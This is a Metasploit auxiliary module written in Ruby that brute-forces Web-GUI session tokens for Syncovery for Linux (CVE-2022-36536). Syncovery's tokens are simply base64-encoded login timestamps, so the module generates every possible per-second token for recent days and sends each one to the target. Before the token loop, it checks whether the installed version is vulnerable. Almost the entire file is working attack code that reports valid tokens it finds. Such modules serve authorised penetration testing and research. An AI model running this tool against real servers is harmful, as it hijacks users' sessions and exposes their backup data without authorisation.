##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'
require 'date'
require 'json'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/syncovery_file_sync_backup'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Syncovery For Linux Web-GUI Session Token Brute-Forcer',
        'Description' => %q{
          This module attempts to brute-force a valid session token for the Syncovery File Sync & Backup Software Web-GUI
          by generating all possible tokens, for every second between 'DateTime.now' and the given X day(s).
          By default today and yesterday (DAYS = 1) will be checked. If a valid session token is found, the module stops.
          The vulnerability exists, because in Syncovery session tokens are basically just base64(m/d/Y H:M:S) at the time
          of the login instead of a random token.
          If a user does not log out (Syncovery v8.x has no logout) session tokens will remain valid until reboot.
        },
        'Author' => [ 'Jan Rude' ],
        'References' => [
          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],
          ['CVE', '2022-36536']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'DisclosureDate' => '2022-09-06',
        'DefaultOptions' => {
          'RPORT' => 8999,
          'STOP_ON_SUCCESS' => true # One valid session is enough
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943
        OptInt.new('DAYS', [true, 'Check today and last X day(s) for valid session token', 1]),
        OptString.new('TARGETURI', [false, 'The path to Syncovery', '/'])
      ]
    )

    deregister_options(
      'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',
      'NTLM::SendLM', 'NTLM::SendNTLM', 'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',
      'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN', 'HttpUsername', 'PASSWORD_SPRAY', 'BLANK_PASSWORDS',
      'USER_FILE', 'USERPASS_FILE', 'PASS_FILE', 'PASSWORD'
    )
  end

  def check_host(_ip)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/get_global_variables'),
      'method' => 'GET'
    )

    if res && res.code == 200
      json_res = res.get_json_document
      if json_res['isSyncoveryWindows'] == 'false'
        version = json_res['SyncoveryTitle']&.scan(/Syncovery\s([A-Za-z0-9.]+)/)&.flatten&.first || ''
        if version.empty?
          vprint_warning("#{peer} - Could not identify version")
          Exploit::CheckCode::Detected
        elsif Rex::Version.new(version) < Rex::Version.new('9.48j') || Rex::Version.new(version) == Rex::Version.new('9.48')
          vprint_good("#{peer} - Syncovery #{version}")
          Exploit::CheckCode::Appears
        else
          vprint_status("#{peer} - Syncovery #{version}")
          Exploit::CheckCode::Safe
        end
      else
        Exploit::CheckCode::Safe
      end
    else
      Exploit::CheckCode::Unknown
    end
  end

  def run_host(ip)
    # Calculate dates
    days = datastore['DAYS']
    if days < 0
      days = 0
    end
    dates = []
    (0..days).each do |day|
      dates << (Date.today - day).strftime('%m/%d/%Y')
    end
    time = DateTime.now.strftime('%H:%M:%S')
    hrs, min, sec = time.split(':')

    # Create possible session tokens
    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new
    dates.each do |date|
      (0..hrs.to_i).reverse_each do |hours|
        (0..min.to_i).reverse_each do |minutes|
          (0..sec.to_i).reverse_each do |seconds|
            timestamp = "#{date} #{format('%.2d', hours)}:#{format('%.2d', minutes)}:#{format('%.2d', seconds)}"
            cred_collection.add_private(Base64.strict_encode64(timestamp).strip)
          end
          sec = 59
        end
        min = 59
      end
      hrs = 23
    end

    print_status("#{peer.strip} - Starting Brute-Forcer")
    scanner = Metasploit::Framework::LoginScanner::SyncoveryFileSyncBackup.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: true, # this will have no effect due to the scanner behaviour when scanning without username
      connection_timeout: 10
    )

    scanner.scan! do |result|
      if result.success?
        print_good("#{peer.strip} - VALID TOKEN: #{result.credential.private}")
      else
        vprint_error("#{peer.strip} - INVALID TOKEN: #{result.credential.private}")
      end
    end
  end
end
